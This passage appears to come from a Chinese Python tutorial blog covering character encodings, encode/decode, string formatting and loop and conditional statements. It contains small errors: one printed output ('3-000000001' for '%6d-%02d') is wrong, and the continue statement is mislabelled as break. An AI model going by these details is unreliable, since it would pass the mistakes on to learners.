<h3 id="一-字符编码"><a href="#一-字符编码" class="headerlink" title="一. 字符编码"></a><font color="#FF6347" face="Comic sans MS">一. 字符编码</font></h3><ol>
<li><p>我们已经讲过了，字符串也是一种数据类型，但是，<strong>字符串</strong>比较特殊的是还有一个<strong>编码</strong>问题。</p>
</li>
<li><p><font color="#FF7F00"><strong>因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理</strong></font>。最早的计算机在设计时采用8个比特（**<code>8 bit</code><strong>）作为一个字节（</strong><code>1 byte</code>**）。</p>
<ol>
<li>所以，**<code>一个字节</code><strong>能表示的最大的整数就是</strong><code>255</code>**（二进制11111111&#x3D;十进制255）；</li>
<li>如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，**<code>4个字节</code><strong>可以表示的最大整数是</strong><code>4294967295</code>**。</li>
</ol>
</li>
<li><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<font color="#FF7F00"><strong>ASCII编码</strong></font>，比如大写字母<code>A</code>的编码是<code>65</code>，小写字母<code>z</code>的编码是<code>122</code>。</p>
</li>
<li><p>但是要处理中文显然一个字节是不够的，<strong>至少需要两个字节</strong>，而且还不能和ASCII编码冲突，所以，<font color="#FF7F00"><strong>中国制定了GB2312编码，用来把中文编进去</strong></font>。</p>
</li>
<li><p>你可以想得到的是，全世界有上百种语言，日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。</p>
</li>
<li><p>因此，<code>Unicode</code>应运而生。<font color="#FF7F00"><strong>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了</strong></font>。</p>
</li>
<li><p>Unicode标准也在不断发展，但最常用的是<font color="#00B2EE"><strong>用两个字节表示一个字符</strong></font>（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。</p>
</li>
<li><p>现在，捋一捋ASCII编码和Unicode编码的区别：<font color="#00B2EE"><strong>ASCII编码是1个字节，而Unicode编码通常是2个字节</strong></font>。</p>
<ol>
<li>字母<code>A</code>用ASCII编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</li>
<li>字符<code>0</code>用ASCII编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符’0’(‘零’)和整数0(零)是不同的；</li>
<li>汉字<code>中</code>已经超出了ASCII编码的范围，用Unicode编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</li>
<li>你可以猜测，如果<font color="red"><strong>把ASCII编码的A用Unicode编码，只需要在前面补0(零)就可以</strong></font>，因此，A的Unicode编码是00000000 01000001。</li>
</ol>
</li>
<li><p>新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，<font color="#00B2EE"><strong>用Unicode编码比ASCII编码需要多一倍的存储空间</strong></font>，在存储和传输上就十分不划算。</p>
</li>
<li><p>所以，<strong>本着节约的精神</strong>，又出现了<font color="#00B2EE"><strong>把Unicode编码转化为“可变长编码”的UTF-8编码</strong></font>。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：</p>
</li>
</ol>
<p>||||<br>:-:|:-:|:-:|:-:|<br>字符    |ASCII    |Unicode    |UTF-8<br>A    |1000001    |00000000 01000001    |01000001<br>中    |x            |01001110 00101101    |11100100 10111000 10101101</p>
<blockquote>
<ol>
<li>从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是<font color="#FF7F00"><strong>ASCII编码实际上可以被看成是UTF-8编码的一部分</strong></font>，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。</li>
</ol>
</blockquote>
<p><strong>总结一下现在计算机系统通用的字符编码工作方式：</strong></p>
<ol>
<li><font color="#FF7F00"><strong>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码</strong></font>。</li>
<li>举例：用记事本编辑(计算机内存中)的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8(保存到文件硬盘或者需要传输)</li>
</ol>
<br>


<p>PS：所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p>
<br>

<br>

<h3 id="二-代码编码和文件编码的设置"><a href="#二-代码编码和文件编码的设置" class="headerlink" title="二. 代码编码和文件编码的设置"></a><font color="#FF6347" face="Comic sans MS">二. 代码编码和文件编码的设置</font></h3><blockquote>
<p><strong>Python中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。</strong><br>解决方法为只要在文件开头加入<code># -*- coding: UTF-8 -*-</code> 或者 <code>#coding=utf-8</code> 就行了<br>（<strong>注意：</strong><code>#coding=utf-8</code> 的 <code>=</code> 号两边不要空格。）</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;你好，世界&quot;</span>;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">你好，世界</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong></p>
</blockquote>
<ol>
<li>Python3.X 源码文件默认使用utf-8编码，所以可以正常解析中文，无需指定 UTF-8 编码。</li>
<li>注意：如果你使用编辑器，同时需要设置 py 文件存储的格式为 UTF-8</li>
</ol>
<br>

<br>

<h3 id="三-字符与编码的转换"><a href="#三-字符与编码的转换" class="headerlink" title="三. 字符与编码的转换"></a><font color="#FF6347" face="Comic sans MS">三. 字符与编码的转换</font></h3><p>在最新的Python 3版本中，<font color="#FF7F00"><strong>字符串是以Unicode编码的</strong></font>，也就是说，Python的字符串支持多语言（字符串可以写任意国家文字）。</p>
<br>

<h4 id="3-1-字符与十进制编码的转换"><a href="#3-1-字符与十进制编码的转换" class="headerlink" title="3.1 字符与十进制编码的转换"></a><font color="#3CB371" face="Comic sans MS">3.1 字符与十进制编码的转换</font></h4><blockquote>
<p><strong>使用函数：</strong></p>
</blockquote>
<ol>
<li>ord()：将字符转换成其对应的整数（十进制），注意不是字符串；</li>
<li>chr()：将十进制整数转换成其对应的字符。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">b=<span class="built_in">chr</span>(<span class="number">120</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">65</span> </span><br><span class="line">x </span><br></pre></td></tr></table></figure>



<br>

<h4 id="3-2-不同编码之间的转换"><a href="#3-2-不同编码之间的转换" class="headerlink" title="3.2 不同编码之间的转换"></a><font color="#3CB371" face="Comic sans MS">3.2 不同编码之间的转换</font></h4><p>由于Python的字符串类型是str，<font color="#FF7F00"><strong>在内存中以Unicode表示，一个字符对应若干个字节</strong></font>。如果要在网络上传输，或者保存到磁盘上，就需要<font color="#FF7F00"><strong>把str变为以字节为单位的bytes</strong></font>。</p>
<p>Python对bytes类型的数据用带<code>b前缀</code>的<font color="#FF7F00"><strong>单引号</strong></font>或<font color="#FF7F00"><strong>双引号</strong></font>表示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span> </span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong>要注意区分’ABC’和b’ABC’，前者是str，后者虽然内容显示得和前者一样，但<font color="#FF7F00"><strong>bytes的每个字符都只占用一个字节</strong></font>。</p>
</blockquote>
<br>


<p><font color="#00B2EE" face="Comic sans MS"><strong>不同编码之间的转换使用函数：</strong></font></p>
<ol>
<li><strong>decode()：</strong> 解码，将其他编码的字符串解码成unicode编码；</li>
<li><strong>encode()：</strong> 转码，将unicode编码的字符串转码成其他编码。</li>
<li><strong>decode(“utf-8”, errors&#x3D;”ignore”) ：</strong> 忽略其中有异常的编码，仅显示有效的编码；</li>
<li><strong>decode(“utf-8”, errors&#x3D;”replace”)：</strong> 替换其中异常的编码，这个相对来可能一眼就知道那些字符编码出问题了；</li>
<li><strong>len()：</strong> 计算的是str的字符数，如果换成bytes，len()函数就计算字节数。</li>
</ol>
<br>

<p>资料查阅：<font color="#00B2EE">[<a href="https://blog.csdn.net/xw_classmate/article/details/51934723">Python中的编码（encode）与解码（decode）程</a>]</font></p>
<br>

<p>字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为<font color="#FF7F00"><strong>中间编码</strong></font>，即先将其他编码的字符串解码（<code>decode</code>）成unicode，再从unicode编码（<code>encode</code>）成另一种编码。</p>
<br>

<p>举例1：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span> </span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span> </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File <span class="string">&quot;C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_21.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)) </span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128) </span></span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>第三个输出报错是因为含有中文的str无法用ASCII编码，因为中文编码的范围超过了ASCII编码的范围，Python会报错。</p>
</blockquote>
<br>

<p>举例2：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes    </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ABC </span><br><span class="line">中文 </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File <span class="string">&quot;C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_22.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0xff in position 3: invalid start byte </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>第三个输出报错是因为bytes中包含无法解码的字节，decode()方法会报错。</p>
</blockquote>
<br>

<p>举例3：如果bytes中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;中&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">中 </span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad&#x27;</span> </span><br><span class="line">中 </span><br></pre></td></tr></table></figure>

<br>

<p>举例4：<code>len()</code>函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;ABC&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">b&#x27;ABC&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">6</span> </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<ol>
<li>可见，1个中文字符经过UTF-8编码后通常<font color="#FF7F00"><strong>会占用3个字节，而1个英文字符只占用1个字节</strong></font>。</li>
<li>在操作字符串时，我们经常遇到str和bytes的互相转换。<font color="#FF7F00"><strong>为了避免乱码问题，应当始终坚持使用UTF-8编码对str和bytes进行转换</strong></font>。</li>
</ol>
</blockquote>
<br>

<br>

<h3 id="四-格式化"><a href="#四-格式化" class="headerlink" title="四. 格式化"></a><font color="#FF6347" face="Comic sans MS">四. 格式化</font></h3><blockquote>
<p><font color="#FF7F00"><strong>重要总结：</strong></font></p>
</blockquote>
<ol>
<li>一个常见的问题是如何输出格式化的字符串。<ol>
<li>我们经常会输出类似”亲爱的<code>xxx</code>你好！你<code>xx</code>月的话费是<code>xx</code>，余额是<code>xx</code>“之类的字符串，而<code>xxx</code>的内容都是根据变量变化的，所以，需要一种简便的格式化字符串的方式。</li>
</ol>
</li>
<li>在Python中，采用的格式化方式和C语言是一致的，用<font color="#FF7F00"><strong>%</strong></font>实现。</li>
<li>%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。</li>
<li>格式化整数还可以指定<font color="#FF7F00"><strong>是否补0和整数</strong></font>；浮点数可以指定<font color="#FF7F00"><strong>小数的位数</strong></font>。</li>
<li>要输出%，用%对其进行转义，即用%%来表示一个%。</li>
<li>另一种格式化字符串的方法是使用字符串的<font color="#FF7F00"><strong>format()方法</strong></font>，它会用传入的参数依次替换字符串内的占位符{0}、{1}……，不过这种方式写起来比%要麻烦得多</li>
</ol>
<br>

<p>常见的占位符有：</p>
<table>
<thead>
<tr>
<th align="center">占位符</th>
<th align="center">替换内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%d</td>
<td align="center">整数</td>
</tr>
<tr>
<td align="center">%f</td>
<td align="center">浮点数</td>
</tr>
<tr>
<td align="center">%s</td>
<td align="center">字符串</td>
</tr>
<tr>
<td align="center">%x</td>
<td align="center">十六进制整数</td>
</tr>
</tbody></table>
<br>

<p>示例代码：（里面的“&#x2F;&#x2F;”并不代表注释符）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;Hello, %s&#x27;</span> % <span class="string">&#x27;world&#x27;</span>    // 替换一个不使用括号</span><br><span class="line">b = <span class="string">&#x27;Hi, %s, you have $%d.&#x27;</span> % (<span class="string">&#x27;Michael&#x27;</span>, <span class="number">1000000</span>)   // 替换多个使用括号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;%6d-%02d&#x27;</span> % (<span class="number">3</span>, <span class="number">1</span>)  //  %6d  表示输出<span class="number">3</span>之前有（<span class="number">6</span>-<span class="number">1</span>）个空格输出</span><br><span class="line">                         //  %05d 表示输出<span class="number">1</span>之前有（<span class="number">5</span>-<span class="number">1</span>）个<span class="number">0</span>输出</span><br><span class="line">d = <span class="string">&#x27;%.2f&#x27;</span> % <span class="number">3.145926</span>    //  %<span class="number">.2</span>f 表示输出的浮点数保留两位小数，第三位小数&gt;=<span class="number">5</span>就向前进<span class="number">1</span></span><br><span class="line">e = <span class="string">&#x27;growth rate: %d %%&#x27;</span> % <span class="number">7</span>   //  转义，用%%表示一个%输出</span><br><span class="line">f=<span class="string">&#x27;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;小明&#x27;</span>, <span class="number">17.125</span>)</span><br><span class="line">                         //  使用字符串<span class="built_in">format</span>()方法，注意括号里面的<span class="number">1</span>的意义</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello, world </span><br><span class="line">Hi, Michael, you have $<span class="number">1000000.</span> </span><br><span class="line">     <span class="number">3</span>-000000001 </span><br><span class="line"><span class="number">3.15</span></span><br><span class="line">growth rate: <span class="number">7</span> % </span><br><span class="line">Hello, 小明, 成绩提升了 <span class="number">17.1</span>% </span><br></pre></td></tr></table></figure>

<br>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-条件语句与循环</title>
    <url>/post/Python-ConditionalStatements-loops/</url>
    <content><![CDATA[<p>记得冒号和换行的缩进呀…(｡◕︎‿◕︎)ﾉﾟ･ﾟ･</p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>条件语句与循环</font> </center>

<br>

<br>

<h3 id="一-条件语句"><a href="#一-条件语句" class="headerlink" title="一. 条件语句"></a><font color="#FF6347" face="Comic sans MS">一. 条件语句</font></h3><br>

<ol>
<li><p>if-else-elif是条件语句，判断bool类型，判断为True就继续执行后面的缩进语句，判断为Flase则不执行缩进语句。</p>
</li>
<li><p>Python程序语言指定任何非0和非空（Null）值为True，0 或者 null为False。</p>
</li>
<li><p>Python<font color="#FF7F00"><strong>只执行if-elif-else 结构中的一个代码块</strong></font>，它依次检查每个条件测试，直到遇到通过了的条件测试。测试通过后，Python将执行紧跟在它后面的代码，并跳过余下的测试。</p>
</li>
<li><p>python 并<font color="#FF7F00"><strong>不支持 switch 语句</strong></font>，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p>
</li>
<li><p>设置if 语句的格式。在条件测试的格式设置方面，PEP 8提供的唯一建议是，在诸如&#x3D;&#x3D; 、&gt;&#x3D; 和&lt;&#x3D; 等比较运算符两边各添加一个空格，例如，<code>if age &lt; 4:</code> 要比<code>if age&lt;4:</code> 好。这样的空格不会影响Python对代码的解读，而只是让代码阅读起来更容易。</p>
</li>
<li><p>注意条件语句如果有多条缩进语句时<font color="#FF7F00"><strong>不能忘了冒号（ <code>:</code> ）</strong></font>，不像C语言或其它语言一样，if后面没有括号。</p>
</li>
</ol>
<br>

<p>书写格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> &lt;条件判断<span class="number">1</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">1</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">2</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">2</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">3</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">3</span>&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;执行<span class="number">4</span>&gt;</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-循环语句"><a href="#二-循环语句" class="headerlink" title="二. 循环语句"></a><font color="#FF6347" face="Comic sans MS">二. 循环语句</font></h3><br>

<p>Python提供了for循环和while循环（在Python中<strong>没有do..while循环</strong>）:</p>
<table>
<thead>
<tr>
<th align="center">循环类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-while-loop.html">while 循环</a></font></td>
<td align="left">在给定的判断条件为 true 时执行循环体，否则退出循环体。</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-for-loop.html">for 循环</a></font></td>
<td align="left">重复执行语句</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-nested-loops.html">嵌套循环</a></font></td>
<td align="left">你可以在while循环体中嵌套for循环</td>
</tr>
</tbody></table>
<br>

<p><strong>循环控制语句</strong><br>循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：</p>
<table>
<thead>
<tr>
<th align="center">循环类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-break-statement.html">break 语句</a></font></td>
<td align="left">在语句块执行过程中终止循环，并且跳出整个循环</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-continue-statement.html">continue 语句</a></font></td>
<td align="left">在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-pass-statement.html">pass 语句</a></font></td>
<td align="left">pass是空语句，是为了保持程序结构的完整性。</td>
</tr>
</tbody></table>
<br>

<h4 id="2-1-While-循环语句"><a href="#2-1-While-循环语句" class="headerlink" title="2.1 While 循环语句"></a><font color="#3CB371" face="Comic sans MS">2.1 While 循环语句</font></h4><p>执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（Null）的值均为True。当判断条件假False时，循环结束。其基本形式为（<strong>注意并没有括号</strong>）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 判断条件：</span><br><span class="line">    执行语句……</span><br></pre></td></tr></table></figure>

<br>

<p>Gif 演示 Python while 语句执行过程：</p>
<p><img data-src="https://i.loli.net/2019/03/01/5c789f82d8f65.gif" alt="loop-over-python-list-animation.gif"></p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>循环使用 else 语句：</strong></font></p>
<p>在 python 中，while … else 在循环条件为 False 时执行 else 语句块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="built_in">print</span> (count, <span class="string">&quot; is  less than 5&quot;</span>)</span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (count, <span class="string">&quot; is not less than 5&quot;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">0</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">1</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">2</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">3</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">4</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">5</span>  <span class="keyword">is</span> <span class="keyword">not</span> less than <span class="number">5</span> </span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="2-2-for-in-语句"><a href="#2-2-for-in-语句" class="headerlink" title="2.2 for..in 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 for..in 语句</font></h4><ol>
<li><p>Python for循环可以遍历任何序列的项目，如一个<font color="#FF7F00"><strong>列表</strong></font>或者一个<font color="#FF7F00"><strong>字符串</strong></font>。</p>
</li>
<li><p>Python 中的 for 语句和 C 或 Pascal 中的略有不同。通常的循环可能会依据一个等差数值步进过程（如 Pascal），或由用户来定义迭代步骤和中止条件（如 C ），Python 的 for 语句依据任意序列（列表或字符串）中的子项，按它们在序列中的顺序来进行迭代。</p>
</li>
<li><p>在迭代过程中修改迭代序列不安全（只有在使用列表这样的可变序列时才会有这样的情况）。如果你想要修改你迭代的序列（例如，复制选择项），你可以迭代它的复本。使用切割标识就可以很方便的做到这一点</p>
</li>
</ol>
<br>

<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>for…in语句处理字符串和列表不同：</strong></font></p>
</blockquote>
<ol>
<li><strong>处理列表：</strong><font color="#FF7F00"><strong>每次取列表的一个元素赋给 in 前面的变量</strong></font>；</li>
<li><strong>处理字符串：</strong><font color="#FF7F00"><strong>每次取字符串的一个字符赋给 in 前面的变量</strong></font>；</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;beauty&#x27;</span>:</span><br><span class="line">     <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">4</span> </span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="number">6</span> </span><br><span class="line">b </span><br><span class="line">e </span><br><span class="line">a </span><br><span class="line">u </span><br><span class="line">t </span><br><span class="line">y </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><font color="#FF7F00"><strong>上例列表 for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句。这就像把序列中的每一个数(或对象)分配给x，一次一个,然后为每个x值执行语句块。</strong></font></p>
</blockquote>
<br>

<h4 id="2-2-break、continue、pass-语句"><a href="#2-2-break、continue、pass-语句" class="headerlink" title="2.2 break、continue、pass 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 break、continue、pass 语句</font></h4><p><font color="#FF7F00"><strong>break语句：</strong></font> 在循环中，可以提前退出循环。<br><font color="#FF7F00"><strong>break语句：</strong></font> 在循环过程中，跳过当前的这次循环，直接开始下一次循环。<br><font color="#FF7F00"><strong>pass语句：</strong></font> pass 是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句。</p>
<br>    

<p>Python 语言 pass 语句语法格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 输出 Python 的每个字母</span></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;Python&#x27;</span>:</span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;这是 pass 块&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;当前字母 :&#x27;</span>, letter)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Good bye!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">当前字母 : P </span><br><span class="line">当前字母 : y </span><br><span class="line">当前字母 : t </span><br><span class="line">这是 <span class="keyword">pass</span> 块 </span><br><span class="line">当前字母 : h </span><br><span class="line">当前字母 : o </span><br><span class="line">当前字母 : n </span><br><span class="line">Good bye! </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-函数</title>
    <url>/post/Python-Function/</url>
    <content><![CDATA[<p>有两种定义函数的方法，千万不要忘了冒号和<code>return</code>   ( ´⚰︎` ) </p>
<span id="more"></span>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>函数</font> </center>


<br>

<br>

<blockquote>
<p><strong>函数分为：</strong><font color="#FF7F00"><strong>内置（系统）函数和自定义函数</strong></font>。</p>
</blockquote>
<ol>
